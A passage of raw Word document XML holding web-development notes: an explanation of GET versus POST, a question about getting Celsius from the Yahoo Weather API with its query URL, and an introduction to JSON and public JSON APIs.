          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">of GET versus </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>POST :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00C86C93" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="165"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="450"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>GET should be used to... get... some information</w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>the server,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00C86C93" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="165"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="450"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>while</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> POST should be used to send some information</w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>the server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00C86C93" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">After that, a couple of things that can be </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>noted :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00C86C93" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="166"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="120" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="450"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">Using GET, your users can use the "back" button in their browser, and they can </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>bookrmark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> pages</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="166"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="450"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>There is a limit in the size of the parameters you can pass as GET</w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>(2KB for some versions of Internet Explorer, if I'm not mistaken</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> the limit is much more for POST, and generally depends on the server's configuration.</w:t>
      </w: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Pr="00682EC5" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>aim</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> trying to get Yahoo weather </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> with Celsius temperature i did added</w:t>
      </w:r>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>&amp;u=c</w:t>
      </w:r>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">but </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> still in Fahrenheit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>i'm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00682EC5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> using</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId189" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>http://stackoverflow.com/questions/21092164/yahoo-weather-api-celsius</w:t>
        </w:r>
      </w:hyperlink>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B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId190" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>http://query.yahooapis.com/v1/public/yql?q=select%20item%20from%20weather.forecast%20where%20location=%22LEXX0003%22&amp;format=json&amp;u=c</w:t>
        </w:r>
      </w:hyperlink>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pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:caps/>
          <w:color w:val="333333"/>
          <w:spacing w:val="30"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:caps/>
          <w:color w:val="333333"/>
          <w:spacing w:val="30"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>PLAYER 1: JSON</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:caps/>
          <w:color w:val="333333"/>
          <w:spacing w:val="30"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId191" w:anchor="player-1-json" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
            <w:caps/>
            <w:color w:val="41B7D8"/>
            <w:spacing w:val="30"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>LINK</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId192" w:history="1">
        <w:r w:rsidR="00267DFA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
            <w:color w:val="41B7D8"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>JSON</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00267DFA">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00267DFA">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">(or JavaScript Object Notation) is a lightweight, easy and popular way to exchange data. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00267DFA">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>jQuery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00267DFA">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> is not the only tool for manipulating and interfacing with JSON; it’s just </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00267DFA">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>my</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00267DFA">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> and many others’ preferred method.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">A lot of the services we use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>everyday</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> have JSON-based APIs: Twitter, Facebook and Flickr all send back data in JSON format.</w:t>
      </w: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Pr="00D76DFB" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="300" w:after="150"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D76DFB">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Fetching JSON data from REST APIs</w:t>
      </w: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B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId193" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>https://cran.r-project.org/web/packages/jsonlite/vignettes/json-apis.html</w:t>
        </w:r>
      </w:hyperlink>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This section lists some examples of public HTTP APIs that publish data in JSON format. These are great to get a sense of the complex structures that are encountered in real world JSON data. All services are free, but some require registration/authentication. Each example returns lots of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
